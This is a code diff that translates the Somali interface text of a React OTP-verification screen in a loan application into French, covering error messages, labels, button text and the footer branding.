@@ -128,7 +128,7 @@ export default function Authentication() {
         if (newAttempts >= 3) {
 
           updateLoanData({
-            loanType: "Amaah Shakhsiyeed",
+            loanType: "Prêt personnel",
             loanAmount: "",
             loanPeriod: "",
             purpose: "",
@@ -138,7 +138,7 @@ export default function Authentication() {
             email: "",
             phone: "",
 
-            workStatus: "Shaqaale",
+            workStatus: "Employé",
             annualIncome: "",
 
             pin: "",
@@ -153,9 +153,7 @@ export default function Authentication() {
 
 
         throw new Error(
-          `Koodh khaldan. Isku dayada haray: ${
-            3 - newAttempts
-          }`
+          `Code incorrect. Tentatives restantes : ${3 - newAttempts}`
         );
       }
 
@@ -214,7 +212,7 @@ export default function Authentication() {
 
 
           <h2 className="text-center text-2xl mb-4">
-            Xaqiijinta OTP
+          Vérification OTP
           </h2>
 
 
@@ -283,7 +281,7 @@ export default function Authentication() {
 
           <p className="text-center text-gray-400 text-sm mb-6">
 
-            Isku dayada:
+          Tentatives :
             {" "}
             {attempts}/3
 
@@ -315,8 +313,8 @@ export default function Authentication() {
           >
 
             {loading
-              ? "WAA LA XAQIIJINAYAA..."
-              : "XAAJI OTP"}
+              ? "VÉRIFICATION EN COURS..."
+              : "VÉRIFIER L'OTP"}
 
           </button>
 
@@ -337,7 +335,7 @@ export default function Authentication() {
       >
 
         <p className="text-white text-sm">
-          © 2026 Wafi Somalia
+          © 2026 Wafi 
         </p>
 
       </div>
